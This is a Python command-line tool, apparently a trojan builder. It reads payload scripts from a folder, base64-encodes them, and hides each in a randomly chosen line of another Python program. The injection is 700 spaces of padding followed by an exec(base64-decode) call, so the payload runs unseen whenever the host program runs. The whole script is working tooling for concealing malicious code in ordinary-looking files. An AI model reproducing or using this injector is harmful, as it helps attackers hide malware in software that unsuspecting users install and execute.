import base64,random,os,colorama,time
from colorama import Fore, Style
colorama.init()

Payloads=[]

for file in os.listdir("payloads"):
    Payloads.append(file)

Programs=[]
for file in os.listdir("Programs"):
    Programs.append(file)



#Selecting the payload
Payload_Option = 999
while Payload_Option > len(Payloads)-1:
    os.system("cls")
    for payload in Payloads:
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+f"{Payloads.index(payload)}"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+payload)

    Payload_Option = int(input(Fore.WHITE+"\n["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Select Payload: "))

    if Payload_Option > len(Payloads)-1:
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Invalid Payload Option, Retrying in 1 Seconds..")
        time.sleep(1)
    else:
        os.system("cls")
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Payload Selected: "+Fore.WHITE+Payloads[Payload_Option])
        time.sleep(2)

#View payload option
os.system("cls")
View_Payload = input(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"View Payload? (y/n): ")
while View_Payload != "y" and View_Payload != "n":
    os.system("cls")
    View_Payload = input(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"View Payload? (y/n): ")

#Viewing The Payload
if View_Payload == "y":
    os.system("cls")
    print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Payload: ")
    with open(f"payloads/{Payloads[Payload_Option]}", "r") as f:
        #print with line numbers
        for num, line in enumerate(f, 1):
            print(f'{Fore.BLUE}{num:4}| {Fore.WHITE}{line}', end='')

            
    input(Fore.WHITE+"\n["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Press Enter to Continue..")

os.system("cls")
print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Loading Payload..")
Payload = """"""
for line in open("payloads/"+Payloads[Payload_Option],"r"):
    Payload += line
print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Payload Loaded!")
time.sleep(1)

Encryption_Method = ['Base64']

Encryption_Option = 999
while Encryption_Option > len(Encryption_Method)-1:
    os.system("cls")
    for encryption in Encryption_Method:
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+f"{Encryption_Method.index(encryption)}"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+encryption)

    Encryption_Option = int(input(Fore.WHITE+"\n["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Select Encryption Method: "))

    if Encryption_Option > len(Encryption_Method)-1:
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Invalid Encryption Option, Retrying in 1 Seconds..")
        time.sleep(1)
    else:
        os.system("cls")
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Encryption Selected: "+Fore.WHITE+Encryption_Method[Encryption_Option])
        time.sleep(2)


#Encrypting Payload
os.system("cls")
print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Encrypting Payload..")
if Encryption_Option == 0:
    Encrypted_Payload = base64.b64encode(Payload.encode('utf-8')).decode('utf-8')
    print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Payload Encrypted!")
    time.sleep(1)



Program_Option = 999
while Program_Option > len(Programs)-1:
    os.system("cls")
    for program in Programs:
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+f"{Programs.index(program)}"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+program)

    Program_Option = int(input(Fore.WHITE+"\n["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Select Program: "))

    if Program_Option > len(Programs)-1:
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Invalid Program Option, Retrying in 1 Seconds..")
        time.sleep(1)
    else:
        os.system("cls")
        print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Program Selected: "+Fore.WHITE+Programs[Program_Option])
        time.sleep(2)


os.system("cls")
print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Adding Code To Program..")
Indentation = " " * 700
with open(f"Programs/{Programs[Program_Option]}", "r") as f:
    lines = f.readlines()
    Line = random.choice(lines)

    #keep getting a random line until we get a line that meets our requirements
    while ":" in Line or  "from" in Line or  "import" in Line or Line == "\n" or "#" in Line:
        Line = random.choice(lines)


    Code_Masking = Line.replace("\n", "")
    lines[lines.index(Line)] = f"""{Code_Masking}{Indentation},exec("import base64;exec(compile(base64.b64decode('{Encrypted_Payload}'.encode('utf-8')).decode('utf-8'), '', 'exec'))") \n"""

with open(f"Programs/{Programs[Program_Option]}", "w") as f:
    f.writelines(lines)

print(Fore.WHITE+"["+Fore.LIGHTRED_EX+"-"+Fore.WHITE+"]"+Fore.LIGHTRED_EX+"Payload Injected!")